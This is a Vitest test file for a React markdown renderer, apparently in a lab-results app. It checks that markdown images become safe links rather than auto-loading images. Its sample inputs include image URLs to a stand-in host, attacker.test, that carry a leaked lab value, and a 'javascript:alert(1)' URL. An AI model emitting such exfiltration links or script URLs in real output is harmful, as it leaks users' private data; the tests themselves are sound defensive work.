import { describe, it, expect } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'

import { InterpretationContent } from '../interpretation-content'

function render(content: string) {
  return renderToStaticMarkup(<InterpretationContent content={content} isStreaming={false} />)
}

describe('InterpretationContent images', () => {
  it('renders a markdown image as a link, never an <img> the browser auto-loads', () => {
    const html = render('Hi ![leak](https://attacker.test/p.png?d=ferritin-12)')
    expect(html).not.toContain('<img')
    expect(html).toContain('href="https://attacker.test/p.png?d=ferritin-12"')
    expect(html).toContain('[image: leak]')
    expect(html).toContain('rel="noopener noreferrer nofollow"')
  })

  it('renders a reference-style image as a link too', () => {
    const html = render('![x][ref]\n\n[ref]: https://attacker.test/x.png')
    expect(html).not.toContain('<img')
    expect(html).toContain('href="https://attacker.test/x.png"')
  })

  it('shows only the alt text for a non-http(s) image URL', () => {
    const html = render('![chart](javascript:alert(1))')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('javascript:')
    expect(html).toContain('[chart]')
  })

  it('leaves ordinary markdown alone', () => {
    const html = render('**Ferritin** is low. See [docs](https://example.com).')
    expect(html).toContain('<strong')
    expect(html).toContain('href="https://example.com"')
  })
})
